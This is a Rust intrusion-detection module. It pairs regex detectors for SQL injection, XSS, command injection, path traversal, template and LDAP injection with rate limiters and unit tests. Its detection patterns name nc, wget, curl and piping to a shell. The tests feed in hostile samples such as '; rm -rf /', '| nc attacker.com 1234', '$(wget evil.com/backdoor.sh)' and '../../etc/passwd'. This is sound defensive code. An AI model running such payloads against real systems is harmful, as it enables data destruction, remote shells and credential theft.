//! Intrusion detection with pattern matching
//!
//! This module provides pattern-based detection of common attack vectors
//! including SQL injection, XSS, command injection, and path traversal.

use super::events::{AttackPattern, EventCategory, SecurityEvent, SecuritySeverity};
use regex::Regex;
use std::collections::HashMap;
use std::sync::Arc;
use thiserror::Error;

/// Intrusion detection errors
#[derive(Debug, Error)]
pub enum DetectionError {
    #[error("Pattern compilation failed: {0}")]
    PatternCompilationFailed(String),

    #[error("Detection failed: {0}")]
    DetectionFailed(String),
}

/// Attack pattern matcher
pub struct PatternMatcher {
    /// SQL injection patterns
    sql_patterns: Vec<Regex>,
    /// XSS patterns
    xss_patterns: Vec<Regex>,
    /// Command injection patterns
    command_patterns: Vec<Regex>,
    /// Path traversal patterns
    path_patterns: Vec<Regex>,
    /// Template injection patterns
    template_patterns: Vec<Regex>,
    /// LDAP injection patterns
    ldap_patterns: Vec<Regex>,
}

impl PatternMatcher {
    /// Create a new pattern matcher with default patterns
    pub fn new() -> Result<Self, DetectionError> {
        Ok(Self {
            sql_patterns: Self::compile_sql_patterns()?,
            xss_patterns: Self::compile_xss_patterns()?,
            command_patterns: Self::compile_command_patterns()?,
            path_patterns: Self::compile_path_patterns()?,
            template_patterns: Self::compile_template_patterns()?,
            ldap_patterns: Self::compile_ldap_patterns()?,
        })
    }

    /// Detect attack patterns in input
    pub fn detect(&self, input: &str) -> AttackPattern {
        if self.is_sql_injection(input) {
            return AttackPattern::SqlInjection;
        }
        if self.is_xss(input) {
            return AttackPattern::Xss;
        }
        if self.is_command_injection(input) {
            return AttackPattern::CommandInjection;
        }
        if self.is_path_traversal(input) {
            return AttackPattern::PathTraversal;
        }
        if self.is_template_injection(input) {
            return AttackPattern::TemplateInjection;
        }
        if self.is_ldap_injection(input) {
            return AttackPattern::LdapInjection;
        }

        AttackPattern::None
    }

    /// Check for SQL injection patterns
    fn is_sql_injection(&self, input: &str) -> bool {
        let lower = input.to_lowercase();
        self.sql_patterns.iter().any(|pattern| pattern.is_match(&lower))
    }

    /// Check for XSS patterns
    fn is_xss(&self, input: &str) -> bool {
        let lower = input.to_lowercase();
        self.xss_patterns.iter().any(|pattern| pattern.is_match(&lower))
    }

    /// Check for command injection patterns
    fn is_command_injection(&self, input: &str) -> bool {
        self.command_patterns.iter().any(|pattern| pattern.is_match(input))
    }

    /// Check for path traversal patterns
    fn is_path_traversal(&self, input: &str) -> bool {
        self.path_patterns.iter().any(|pattern| pattern.is_match(input))
    }

    /// Check for template injection patterns
    fn is_template_injection(&self, input: &str) -> bool {
        self.template_patterns.iter().any(|pattern| pattern.is_match(input))
    }

    /// Check for LDAP injection patterns
    fn is_ldap_injection(&self, input: &str) -> bool {
        self.ldap_patterns.iter().any(|pattern| pattern.is_match(input))
    }

    /// Compile SQL injection patterns
    fn compile_sql_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r"(\bor\b|\band\b).*=.*",
            r"union.*select",
            r"select.*from",
            r"insert.*into",
            r"delete.*from",
            r"drop.*table",
            r"update.*set",
            r"--.*$",
            r"/\*.*\*/",
            r";\s*drop",
            r"'.*or.*'.*'",
            r"'.*=.*'",
            r"1.*=.*1",
            r"admin.*--",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Compile XSS patterns
    fn compile_xss_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r"<script[^>]*>",
            r"javascript:",
            r"onerror\s*=",
            r"onload\s*=",
            r"onclick\s*=",
            r"<iframe",
            r"<embed",
            r"<object",
            r"document\.cookie",
            r"window\.location",
            r"eval\s*\(",
            r"alert\s*\(",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Compile command injection patterns
    fn compile_command_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r";\s*rm\s",
            r";\s*cat\s",
            r"\|\s*nc\s",
            r"&&\s*wget",
            r"`.*`",
            r"\$\(.*\)",
            r">\s*/dev/",
            r"<\s*/dev/",
            r";\s*curl",
            r"\|\s*sh",
            r"\|\s*bash",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Compile path traversal patterns
    fn compile_path_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r"\.\./",
            r"\.\.",
            r"%2e%2e",
            r"\.\.\\",
            r"%252e%252e",
            r"..;",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Compile template injection patterns
    fn compile_template_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r"\{\{.*\}\}",
            r"\{%.*%\}",
            r"\$\{.*\}",
            r"<%.*%>",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Compile LDAP injection patterns
    fn compile_ldap_patterns() -> Result<Vec<Regex>, DetectionError> {
        let patterns = vec![
            r"\*\)",
            r"\(\|",
            r"\(&",
            r"\(objectclass=\*\)",
            r"admin\)\(",
        ];

        Self::compile_patterns(&patterns)
    }

    /// Helper to compile regex patterns
    fn compile_patterns(patterns: &[&str]) -> Result<Vec<Regex>, DetectionError> {
        patterns
            .iter()
            .map(|p| {
                Regex::new(p).map_err(|e| {
                    DetectionError::PatternCompilationFailed(format!("{}: {}", p, e))
                })
            })
            .collect()
    }
}

impl Default for PatternMatcher {
    fn default() -> Self {
        // Default patterns are hard-coded and must compile. If this fails,
        // it indicates a bug in the pattern definitions themselves.
        match Self::new() {
            Ok(matcher) => matcher,
            Err(e) => {
                log::error!("Failed to initialize default pattern matcher: {}", e);
                // Return a matcher with empty patterns as fallback
                Self {
                    sql_patterns: vec![],
                    xss_patterns: vec![],
                    command_patterns: vec![],
                    path_patterns: vec![],
                    template_patterns: vec![],
                    ldap_patterns: vec![],
                }
            }
        }
    }
}

/// Rate limiter for detecting brute force attacks
pub struct RateLimiter {
    /// Request counts per source (IP, user, etc.)
    counters: HashMap<String, RequestCounter>,
    /// Maximum requests per window
    max_requests: usize,
    /// Time window in seconds
    window_secs: u64,
}

/// Request counter for rate limiting
#[derive(Debug, Clone)]
struct RequestCounter {
    /// Number of requests
    count: usize,
    /// Window start time (Unix timestamp)
    window_start: i64,
}

impl RateLimiter {
    /// Create a new rate limiter
    pub fn new(max_requests: usize, window_secs: u64) -> Self {
        Self {
            counters: HashMap::new(),
            max_requests,
            window_secs,
        }
    }

    /// Check if request should be allowed
    pub fn check(&mut self, source: &str) -> bool {
        use chrono::Utc;

        let now = Utc::now().timestamp();

        let counter = self.counters.entry(source.to_string()).or_insert(RequestCounter {
            count: 0,
            window_start: now,
        });

        // Check if we're in a new window
        if now - counter.window_start >= self.window_secs as i64 {
            counter.count = 0;
            counter.window_start = now;
        }

        counter.count += 1;

        counter.count <= self.max_requests
    }

    /// Check if source is currently rate limited
    pub fn is_limited(&self, source: &str) -> bool {
        use chrono::Utc;

        let now = Utc::now().timestamp();

        if let Some(counter) = self.counters.get(source) {
            if now - counter.window_start < self.window_secs as i64 {
                return counter.count > self.max_requests;
            }
        }

        false
    }

    /// Get current request count for source
    pub fn get_count(&self, source: &str) -> usize {
        use chrono::Utc;

        let now = Utc::now().timestamp();

        self.counters
            .get(source)
            .filter(|c| now - c.window_start < self.window_secs as i64)
            .map(|c| c.count)
            .unwrap_or(0)
    }

    /// Reset counter for source
    pub fn reset(&mut self, source: &str) {
        self.counters.remove(source);
    }

    /// Clear all counters
    pub fn clear(&mut self) {
        self.counters.clear();
    }
}

/// Intrusion detection system
pub struct IntrusionDetector {
    /// Pattern matcher
    pattern_matcher: Arc<PatternMatcher>,
    /// Rate limiter for authentication attempts
    auth_limiter: RateLimiter,
    /// Rate limiter for general requests
    request_limiter: RateLimiter,
}

impl IntrusionDetector {
    /// Create a new intrusion detector
    pub fn new() -> Result<Self, DetectionError> {
        Ok(Self {
            pattern_matcher: Arc::new(PatternMatcher::new()?),
            auth_limiter: RateLimiter::new(5, 300), // 5 attempts per 5 minutes
            request_limiter: RateLimiter::new(100, 60), // 100 requests per minute
        })
    }

    /// Analyze input for attack patterns
    pub fn analyze_input(&self, input: &str) -> Option<SecurityEvent> {
        let pattern = self.pattern_matcher.detect(input);

        if !matches!(pattern, AttackPattern::None) {
            Some(SecurityEvent::input_validation_failed(input, pattern))
        } else {
            None
        }
    }

    /// Check authentication rate limit
    pub fn check_auth_rate(&mut self, source: &str) -> Option<SecurityEvent> {
        if !self.auth_limiter.check(source) {
            Some(
                SecurityEvent::new(
                    SecuritySeverity::High,
                    EventCategory::Authentication,
                    format!("Authentication rate limit exceeded for {}", source),
                )
                .with_attack_pattern(AttackPattern::BruteForce)
                .with_metadata("source", source)
                .with_metadata("limit_type", "authentication")
                .with_success(false),
            )
        } else {
            None
        }
    }

    /// Check request rate limit
    pub fn check_request_rate(&mut self, source: &str) -> Option<SecurityEvent> {
        if !self.request_limiter.check(source) {
            Some(
                SecurityEvent::new(
                    SecuritySeverity::Medium,
                    EventCategory::Network,
                    format!("Request rate limit exceeded for {}", source),
                )
                .with_attack_pattern(AttackPattern::DenialOfService)
                .with_metadata("source", source)
                .with_metadata("limit_type", "request")
                .with_success(false),
            )
        } else {
            None
        }
    }

    /// Get authentication attempt count for source
    pub fn get_auth_attempts(&self, source: &str) -> usize {
        self.auth_limiter.get_count(source)
    }

    /// Reset authentication attempts for source
    pub fn reset_auth_attempts(&mut self, source: &str) {
        self.auth_limiter.reset(source);
    }
}

impl Default for IntrusionDetector {
    fn default() -> Self {
        // Default configuration should never fail in practice since we use
        // sensible defaults for all components. If this fails, we provide
        // a degraded detector as fallback.
        match Self::new() {
            Ok(detector) => detector,
            Err(e) => {
                log::error!("Failed to initialize default intrusion detector: {}", e);
                // Return detector with fallback components
                Self {
                    pattern_matcher: Arc::new(PatternMatcher::default()),
                    auth_limiter: RateLimiter::new(100, 60),
                    request_limiter: RateLimiter::new(1000, 60),
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sql_injection_detection() {
        // Arrange
        let matcher = PatternMatcher::new().unwrap();

        // Act & Assert
        assert_eq!(
            matcher.detect("SELECT * FROM users"),
            AttackPattern::SqlInjection
        );
        assert_eq!(
            matcher.detect("admin' OR '1'='1"),
            AttackPattern::SqlInjection
        );
        assert_eq!(
            matcher.detect("1 UNION SELECT password FROM users"),
            AttackPattern::SqlInjection
        );
        assert_eq!(matcher.detect("normal text"), AttackPattern::None);
    }

    #[test]
    fn test_xss_detection() {
        // Arrange
        let matcher = PatternMatcher::new().unwrap();

        // Act & Assert
        assert_eq!(
            matcher.detect("<script>alert('XSS')</script>"),
            AttackPattern::Xss
        );
        assert_eq!(
            matcher.detect("javascript:alert(1)"),
            AttackPattern::Xss
        );
        assert_eq!(
            matcher.detect("<img src=x onerror=alert(1)>"),
            AttackPattern::Xss
        );
    }

    #[test]
    fn test_command_injection_detection() {
        // Arrange
        let matcher = PatternMatcher::new().unwrap();

        // Act & Assert
        assert_eq!(
            matcher.detect("; rm -rf /"),
            AttackPattern::CommandInjection
        );
        assert_eq!(
            matcher.detect("| nc attacker.com 1234"),
            AttackPattern::CommandInjection
        );
        assert_eq!(
            matcher.detect("$(wget evil.com/backdoor.sh)"),
            AttackPattern::CommandInjection
        );
    }

    #[test]
    fn test_path_traversal_detection() {
        // Arrange
        let matcher = PatternMatcher::new().unwrap();

        // Act & Assert
        assert_eq!(
            matcher.detect("../../etc/passwd"),
            AttackPattern::PathTraversal
        );
        assert_eq!(
            matcher.detect("..\\..\\windows\\system32"),
            AttackPattern::PathTraversal
        );
        assert_eq!(
            matcher.detect("%2e%2e/etc/shadow"),
            AttackPattern::PathTraversal
        );
    }

    #[test]
    fn test_template_injection_detection() {
        // Arrange
        let matcher = PatternMatcher::new().unwrap();

        // Act & Assert
        assert_eq!(
            matcher.detect("{{7*7}}"),
            AttackPattern::TemplateInjection
        );
        assert_eq!(
            matcher.detect("${system('whoami')}"),
            AttackPattern::TemplateInjection
        );
    }

    #[test]
    fn test_rate_limiter_basic() {
        // Arrange
        let mut limiter = RateLimiter::new(3, 60);

        // Act & Assert
        assert!(limiter.check("user1"));
        assert!(limiter.check("user1"));
        assert!(limiter.check("user1"));
        assert!(!limiter.check("user1")); // Should be limited
    }

    #[test]
    fn test_rate_limiter_different_sources() {
        // Arrange
        let mut limiter = RateLimiter::new(2, 60);

        // Act & Assert
        assert!(limiter.check("user1"));
        assert!(limiter.check("user1"));
        assert!(!limiter.check("user1"));

        // Different source should have separate limit
        assert!(limiter.check("user2"));
        assert!(limiter.check("user2"));
        assert!(!limiter.check("user2"));
    }

    #[test]
    fn test_rate_limiter_is_limited() {
        // Arrange
        let mut limiter = RateLimiter::new(2, 60);

        // Act
        limiter.check("user1");
        limiter.check("user1");
        limiter.check("user1");

        // Assert
        assert!(limiter.is_limited("user1"));
        assert!(!limiter.is_limited("user2"));
    }

    #[test]
    fn test_rate_limiter_get_count() {
        // Arrange
        let mut limiter = RateLimiter::new(5, 60);

        // Act
        limiter.check("user1");
        limiter.check("user1");
        limiter.check("user1");

        // Assert
        assert_eq!(limiter.get_count("user1"), 3);
        assert_eq!(limiter.get_count("user2"), 0);
    }

    #[test]
    fn test_rate_limiter_reset() {
        // Arrange
        let mut limiter = RateLimiter::new(1, 60);
        limiter.check("user1");
        limiter.check("user1");

        // Act
        limiter.reset("user1");

        // Assert
        assert!(!limiter.is_limited("user1"));
        assert_eq!(limiter.get_count("user1"), 0);
    }

    #[test]
    fn test_intrusion_detector_analyze_input() {
        // Arrange
        let detector = IntrusionDetector::new().unwrap();

        // Act
        let event1 = detector.analyze_input("SELECT * FROM users");
        let event2 = detector.analyze_input("normal text");

        // Assert
        assert!(event1.is_some());
        assert_eq!(event1.unwrap().attack_pattern, AttackPattern::SqlInjection);
        assert!(event2.is_none());
    }

    #[test]
    fn test_intrusion_detector_auth_rate() {
        // Arrange
        let mut detector = IntrusionDetector::new().unwrap();

        // Act - exceed auth rate limit
        for _ in 0..5 {
            detector.check_auth_rate("192.168.1.1");
        }
        let event = detector.check_auth_rate("192.168.1.1");

        // Assert
        assert!(event.is_some());
        let evt = event.unwrap();
        assert_eq!(evt.severity, SecuritySeverity::High);
        assert_eq!(evt.attack_pattern, AttackPattern::BruteForce);
    }

    #[test]
    fn test_intrusion_detector_request_rate() {
        // Arrange
        let mut detector = IntrusionDetector::new().unwrap();

        // Act - exceed request rate limit
        for _ in 0..100 {
            detector.check_request_rate("10.0.0.1");
        }
        let event = detector.check_request_rate("10.0.0.1");

        // Assert
        assert!(event.is_some());
        let evt = event.unwrap();
        assert_eq!(evt.severity, SecuritySeverity::Medium);
        assert_eq!(evt.attack_pattern, AttackPattern::DenialOfService);
    }
}
